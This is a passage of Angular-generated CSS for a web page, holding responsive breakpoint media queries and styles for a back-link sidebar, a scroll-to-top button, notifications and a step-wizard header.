      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-landscape "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg  "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-portrait "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-landscape "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      .mod-content--backlink[_ngcontent-ng-c2708957342] {
        position: absolute;
        z-index: 1000;
        top: 0;
        left: 0;
        transition: margin-top ease-out .25s;
        width: 40px;
        height: 100%;
        min-height: 100vh;
        text-align: center;
        color: #333;
        background-color: #fff
      }

      @media screen and (min-width: 1200px) {
        .mod-content--backlink[_ngcontent-ng-c2708957342] {
          width: 40px
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) {
        .mod-content--backlink[_ngcontent-ng-c2708957342] {
          width: 40px
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        .mod-content--backlink[_ngcontent-ng-c2708957342] {
          width: 40px
        }
      }

      @media screen and (max-width: 767px) {
        .mod-content--backlink[_ngcontent-ng-c2708957342] {
          width: 30px
        }
      }

      .mod-content--backlink[_ngcontent-ng-c2708957342] .mod-content--backlink__button[_ngcontent-ng-c2708957342] {
        font-size: 16px;
        background-color: #ddd;
        padding: 50px 0;
        width: 100%;
        position: absolute;
        top: 0;
        left: 0
      }

      @media screen and (max-width: 767px) {
        .mod-content--backlink[_ngcontent-ng-c2708957342] .mod-content--backlink__button[_ngcontent-ng-c2708957342] {
          padding: 27px 0
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        .mod-content--backlink[_ngcontent-ng-c2708957342] .mod-content--backlink__button[_ngcontent-ng-c2708957342] {
          padding: 27px 0
        }
      }
    </style>
    <style>
      .scroll-to-top[_ngcontent-ng-c281969890] {
        position: fixed
      }

      @media screen and (max-width: 768px) {
        .scroll-to-top[_ngcontent-ng-c281969890] {
          bottom: 2rem;
          right: 2rem
        }
      }
    </style>
    <style>
      @media screen and (max-width: 767px) {

        .mod-notification--sign__right[_ngcontent-ng-c3001457458],
        .mod-notification--sign__right[_ngcontent-ng-c3001457458] .mod-valign[_ngcontent-ng-c3001457458] {
          height: auto;
          position: relative;
          float: right
        }

        .mod-notification[_ngcontent-ng-c3001457458] .mod-notification--sign__right[_ngcontent-ng-c3001457458]~.mod-notification--content[_ngcontent-ng-c3001457458] {
          padding-right: 0
        }
      }
    </style>
    <style>
      #clearfix[_ngcontent-ng-c4122432623]:before,
      #clearfix[_ngcontent-ng-c4122432623]:after {
        content: " ";
        display: table
      }

      #clearfix[_ngcontent-ng-c4122432623]:after {
        clear: both
      }

      #justify[_ngcontent-ng-c4122432623] {
        text-align: justify
      }

      #justify[_ngcontent-ng-c4122432623]:after {
        content: "";
        display: inline-block;
        width: 100%
      }

      #link-in-text[_ngcontent-ng-c4122432623],
      #link-in-text[_ngcontent-ng-c4122432623]:hover,
      #link-in-text[_ngcontent-ng-c4122432623]:focus,
      #link-in-text[_ngcontent-ng-c4122432623]:active,
      #link-in-text[_ngcontent-ng-c4122432623]:visited {
        color: #1e416e;
        outline: none;
        text-decoration: underline
      }

      #link-in-text[_ngcontent-ng-c4122432623]:hover,
      #link-in-text[_ngcontent-ng-c4122432623]:focus {
        color: #173256;
        text-decoration: underline
      }

      #overlay[_ngcontent-ng-c4122432623] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
      }

      #trim-margin[_ngcontent-ng-c4122432623]>[_ngcontent-ng-c4122432623]:first-child {
        margin-top: 0 !important
      }

      #trim-margin[_ngcontent-ng-c4122432623]>[_ngcontent-ng-c4122432623]:last-child {
        margin-bottom: 0 !important
      }

      body[_ngcontent-ng-c4122432623]:before {
        content: "";
        visibility: hidden;
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        border: 0
      }

      @media screen and (max-width: 767px) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs  "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-portrait "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-portrait resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-landscape "
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-landscape resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm  "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-portrait "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-landscape "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md  "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-portrait "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-landscape "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg  "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-portrait "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-landscape "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4122432623]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      header[_ngcontent-ng-c4122432623] {
        padding: 0 32px 2em;
        margin-bottom: -32px;
        width: 90%
      }

      @media screen and (max-width: 767px) {
        header[_ngcontent-ng-c4122432623] {
          width: 100%;
          padding-left: 0;
          padding-right: 0
        }
      }

      header[_ngcontent-ng-c4122432623]+.mod-centercol--root[_ngcontent-ng-c4122432623] {
        clear: both
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper[_ngcontent-ng-c4122432623] {
        color: #333;
        position: relative;
        width: 25%;
        float: left
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper[_ngcontent-ng-c4122432623] button[_ngcontent-ng-c4122432623] {
        width: 100%;
        background: transparent;
        padding: 0;
        margin: 0 0 .4em;
        border: 0;
        display: flex;
        flex-direction: column;
        align-content: center;
        align-items: center
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper[_ngcontent-ng-c4122432623] button[_ngcontent-ng-c4122432623] span[_ngcontent-ng-c4122432623] {
        font-size: 12px;
        padding: 0
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper[_ngcontent-ng-c4122432623] button[_ngcontent-ng-c4122432623] span.step-index[_ngcontent-ng-c4122432623] {
        display: block;
        position: relative;
        border: 1px solid #333333;
        border-radius: 50%;
        height: 32px;
        width: 32px;
        z-index: 2;
        background: white;
        line-height: 32px;
        margin: 0 auto
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper[_ngcontent-ng-c4122432623] button[_ngcontent-ng-c4122432623] span.step-label[_ngcontent-ng-c4122432623] {
        margin-top: 5px;
        width: 100%;
        display: block
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper[_ngcontent-ng-c4122432623]:not(:first-child):before {
        border-bottom: 1px solid #333333;
        content: "";
        height: 0;
        width: 100%;
        border-collapse: collapse;
        position: relative;
        display: block;
        z-index: 1;
        top: 1em;
        left: -50%
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper.active[_ngcontent-ng-c4122432623] {
        color: #921000
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper.active[_ngcontent-ng-c4122432623] .step-label[_ngcontent-ng-c4122432623] {
        text-decoration: underline
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper.active[_ngcontent-ng-c4122432623] button[_ngcontent-ng-c4122432623] span.step-index[_ngcontent-ng-c4122432623] {
        border-color: #921000
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper.active[_ngcontent-ng-c4122432623]:not(:first-child):before {
        border-color: #333
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper.disabled[_ngcontent-ng-c4122432623] {
        color: #bbb
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper.disabled[_ngcontent-ng-c4122432623] button[_ngcontent-ng-c4122432623] span.step-index[_ngcontent-ng-c4122432623] {
        border-color: #bbb
      }

      header[_ngcontent-ng-c4122432623] .step-wrapper.disabled[_ngcontent-ng-c4122432623]:not(:first-child):before {
        border-color: #bbb
      }
    </style>
    <style>
      #clearfix[_ngcontent-ng-c2313363750]:before,
      #clearfix[_ngcontent-ng-c2313363750]:after {
        content: " ";
        display: table
      }

      #clearfix[_ngcontent-ng-c2313363750]:after {
        clear: both
      }

      #justify[_ngcontent-ng-c2313363750] {
        text-align: justify
      }

      #justify[_ngcontent-ng-c2313363750]:after {
        content: "";
        display: inline-block;
        width: 100%
      }

      #link-in-text[_ngcontent-ng-c2313363750],
      #link-in-text[_ngcontent-ng-c2313363750]:hover,
      #link-in-text[_ngcontent-ng-c2313363750]:focus,
      #link-in-text[_ngcontent-ng-c2313363750]:active,
      #link-in-text[_ngcontent-ng-c2313363750]:visited {
        color: #1e416e;
        outline: none;
        text-decoration: underline
      }

      #link-in-text[_ngcontent-ng-c2313363750]:hover,
      #link-in-text[_ngcontent-ng-c2313363750]:focus {
        color: #173256;
        text-decoration: underline
      }

      #overlay[_ngcontent-ng-c2313363750] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
      }

      #trim-margin[_ngcontent-ng-c2313363750]>[_ngcontent-ng-c2313363750]:first-child {
        margin-top: 0 !important
      }

      #trim-margin[_ngcontent-ng-c2313363750]>[_ngcontent-ng-c2313363750]:last-child {
        margin-bottom: 0 !important
      }

      body[_ngcontent-ng-c2313363750]:before {
        content: "";
        visibility: hidden;
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        border: 0
      }

      @media screen and (max-width: 767px) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs  "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-portrait "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-portrait resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-landscape "
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-landscape resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm  "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-portrait "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-landscape "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
